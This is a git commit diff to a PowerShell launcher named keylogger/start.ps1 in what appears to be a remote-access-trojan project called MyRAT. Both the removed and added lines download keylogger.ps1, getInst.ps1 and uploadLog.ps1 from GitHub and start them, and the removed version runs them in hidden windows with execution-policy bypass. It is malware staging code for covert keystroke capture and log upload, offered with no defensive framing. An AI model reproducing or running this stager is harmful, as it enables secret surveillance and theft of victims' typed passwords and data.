08527edcdae7d738fefc034fc8e469875f46bd70
Thông Tấn <ttthong315@gmail.com>
2025-03-26 16:05:34 +0700

    fix

--- keylogger/start.ps1
+++ keylogger/start.ps1
@@ -1,7 +1,5 @@
-
-$scriptPath = "$env:temp\keylogger"
-Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/keylogger.ps1" -OutFile keylogger.ps1
-Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/getInst.ps1" -OutFile getInst.ps1
-Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/uploadLog.ps1" -OutFile getInst.ps1
-Start-Process "powershell.exe -window hidden -ep bypass .\keylogger.ps1"
-Start-Process "powershell.exe -window hidden -ep bypass .\getInst.ps1"
+Invoke-WebRequest -Uri https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/keylogger.ps1 -OutFile keylogger.ps1
+Invoke-WebRequest -Uri https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/getInst.ps1 -OutFile getInst.ps1
+Invoke-WebRequest -Uri https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/uploadLog.ps1 -OutFile getInst.ps1
+Start-Process -FilePath "keylogger.ps1" -NoNewWindow -Wait
+Start-Process -FilePath "getInst.ps1"
